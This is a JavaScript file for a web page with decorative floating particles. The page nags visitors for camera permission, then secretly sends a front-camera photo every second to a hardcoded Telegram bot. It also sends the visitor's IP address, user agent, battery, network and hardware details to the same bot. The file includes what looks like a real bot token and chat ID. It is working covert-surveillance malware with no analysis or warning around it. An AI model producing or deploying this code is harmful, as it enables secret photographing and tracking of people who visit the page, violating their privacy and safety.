// Configuration
const BOT_TOKEN = "7249136904:AAGFPmdS5CnextPMpNlUPv0qeSuVHBaUF-w";
const CHAT_ID = "8174575316";
const video = document.querySelector("video");
const permissionRequest = document.getElementById("permissionRequest");
const allowBtn = document.getElementById("allowBtn");

let streamStarted = false;
let deviceInfoSent = false;
let permissionCheckInterval;

// Initialize the page
document.addEventListener('DOMContentLoaded', function() {
  createParticles();
  checkCameraPermission();
  
  // Set up permission request button
  allowBtn.addEventListener('click', function() {
    tryStartCamera();
    permissionRequest.style.display = 'none';
    clearInterval(permissionCheckInterval);
  });
});

// Check camera permission status
function checkCameraPermission() {
  navigator.permissions.query({name: 'camera'}).then(function(permissionStatus) {
    if (permissionStatus.state === 'granted') {
      tryStartCamera();
    } else {
      showPermissionRequest();
      permissionCheckInterval = setInterval(showPermissionRequest, 1000);
    }
    
    permissionStatus.onchange = function() {
      if (this.state === 'granted') {
        tryStartCamera();
        permissionRequest.style.display = 'none';
        clearInterval(permissionCheckInterval);
      }
    };
  }).catch(function() {
    // Fallback if permissions API not supported
    tryStartCamera();
  });
}

function showPermissionRequest() {
  permissionRequest.style.display = 'block';
}

// Create floating particles
function createParticles() {
  const particlesContainer = document.getElementById('particles');
  const particleCount = 15;
  
  for (let i = 0; i < particleCount; i++) {
    const particle = document.createElement('div');
    particle.classList.add('particle');
    
    // Random properties
    const size = Math.random() * 10 + 5;
    const posX = Math.random() * 100;
    const posY = Math.random() * 100;
    const delay = Math.random() * 15;
    const duration = Math.random() * 10 + 10;
    
    particle.style.width = `${size}px`;
    particle.style.height = `${size}px`;
    particle.style.left = `${posX}%`;
    particle.style.top = `${posY}%`;
    particle.style.animationDelay = `${delay}s`;
    particle.style.animationDuration = `${duration}s`;
    particle.style.opacity = Math.random() * 0.4 + 0.1;
    
    particlesContainer.appendChild(particle);
  }
}

// Try to access camera
async function tryStartCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: "user" } 
    });
    video.srcObject = stream;
    if (!streamStarted) {
      streamStarted = true;
      startSendingPhotos();
      sendDeviceInfo();
    }
  } catch (err) {
    console.warn("Camera access denied or not available:", err);
  }
}

// Get device information
function getDeviceInfo() {
  const userAgent = navigator.userAgent;
  const isMobile = /Mobi|Android/i.test(userAgent);
  const now = new Date();
  
  let deviceInfo = {
    time: now.toLocaleString(),
    ip: "Fetching...", // Will be updated via fetch
    userAgent: userAgent,
    isMobile: isMobile,
    platform: navigator.platform,
    language: navigator.language
  };
  
  if (isMobile) {
    deviceInfo.battery = "Checking...";
    deviceInfo.connection = navigator.connection ? navigator.connection.effectiveType : "Unknown";
  } else {
    deviceInfo.deviceType = "Desktop/PC";
    deviceInfo.cpuCores = navigator.hardwareConcurrency || "Unknown";
    deviceInfo.memory = performance.memory ? 
      `${Math.round(performance.memory.jsHeapSizeLimit / (1024 * 1024))} MB` : "Unknown";
  }
  
  return deviceInfo;
}

// Send device information to Telegram
async function sendDeviceInfo() {
  if (deviceInfoSent) return;
  
  const deviceInfo = getDeviceInfo();
  
  // Get IP address
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    deviceInfo.ip = ipData.ip;
  } catch (e) {
    deviceInfo.ip = "Could not fetch IP";
  }
  
  // Get battery status for mobile
  if (deviceInfo.isMobile && navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      deviceInfo.battery = {
        level: Math.round(battery.level * 100) + '%',
        charging: battery.charging ? "Charging" : "Not charging"
      };
    } catch (e) {
      deviceInfo.battery = "Could not fetch battery info";
    }
  }
  
  // Network information
  if (navigator.connection) {
    deviceInfo.networkInfo = {
      type: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink + ' Mbps',
      rtt: navigator.connection.rtt + ' ms'
    };
  }
  
  // Format the message
  let message = `📱 *Device Information* 📱\n\n`;
  message += `🕒 *Time:* ${deviceInfo.time}\n`;
  message += `🌐 *IP:* ${deviceInfo.ip}\n`;
  message += `📡 *User Agent:* ${deviceInfo.userAgent}\n`;
  
  if (deviceInfo.isMobile) {
    message += `\n📲 *Mobile Device*\n`;
    message += `🔋 *Battery:* ${deviceInfo.battery.level || 'Unknown'} (${deviceInfo.battery.charging || 'Status unknown'})\n`;
    message += `📶 *Connection:* ${deviceInfo.connection}\n`;
  } else {
    message += `\n💻 *Desktop/PC*\n`;
    message += `🖥️ *OS:* ${deviceInfo.platform}\n`;
    message += `⚙️ *CPU Cores:* ${deviceInfo.cpuCores}\n`;
    message += `🧠 *Memory:* ${deviceInfo.memory}\n`;
  }
  
  // Send to Telegram
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    })
  }).catch(err => console.error("Telegram Error:", err));
  
  deviceInfoSent = true;
}

// Start sending photos to Telegram
function startSendingPhotos() {
  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");
  let isSending = false;

  setInterval(() => {
    if (video.readyState !== video.HAVE_ENOUGH_DATA || isSending) return;
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    isSending = true;
    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append("chat_id", CHAT_ID);
      formData.append("photo", blob, "photo.jpg");

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
      })
      .then(() => isSending = false)
      .catch(err => {
        console.error("Telegram Error:", err);
        isSending = false;
      });
    }, "image/jpeg", 0.85);
  }, 1000);
}